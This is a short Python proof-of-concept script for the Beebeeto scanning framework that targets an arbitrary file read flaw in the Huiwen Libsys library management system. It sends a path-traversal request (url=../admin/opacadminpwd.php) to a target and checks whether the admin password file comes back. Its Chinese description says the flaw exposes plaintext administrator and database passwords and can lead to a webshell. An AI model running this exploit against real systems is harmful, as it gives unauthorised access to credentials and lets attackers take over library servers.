#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0109',
            'name': '汇文Libsys图书馆管理系统 /zplug/ajax_asyn_link.old.php 任意文件读取漏洞 POC',
            'author': 'ko0zhi',
            'create_date': '2015-06-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'libsys',
            'vul_version': ['*'],
            'type': 'Arbitrary File Read',
            'tag': ['Libsys漏洞', '/zplug/ajax_asyn_link.old.php漏洞', 'php', '图书馆管理系统'],
            'desc': '''
                    汇文软件Libsys图书馆管理系统任意文件读取，可以直接获取管理员账号，密码明文、数据库密码明文、
                    配置信息等非常敏感的信息，可以轻松实现无任何限制获取 WEBSHELL ...
                    ''',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-059850'],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        verify_url = ('%s/zplug/ajax_asyn_link.old.php?url='
                      '../admin/opacadminpwd.php') % url
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        if req.status_code == 200 and '$strPassWdView' in req.content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())